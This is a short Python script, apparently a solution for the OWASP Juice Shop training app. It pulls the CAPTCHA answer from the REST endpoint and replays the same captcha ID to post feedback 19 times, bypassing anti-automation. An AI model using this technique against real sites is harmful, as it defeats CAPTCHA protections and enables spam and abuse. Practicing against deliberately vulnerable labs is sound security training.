import requests

juice_shop_url="https://juice-shop-kha.herokuapp.com/"

capcha_response = requests.get(juice_shop_url + "rest/captcha")

capcha_data = capcha_response.json()

feedback = {
            "captchaId": capcha_data['captchaId'],
            "comment": "This is my comment",
            "captcha": capcha_data['answer'],
            "rating": 2
        }

for i in range(1,20):
    feedback_response = requests.post(juice_shop_url + "/api/Feedbacks", json=feedback)
    print(feedback_response.json())
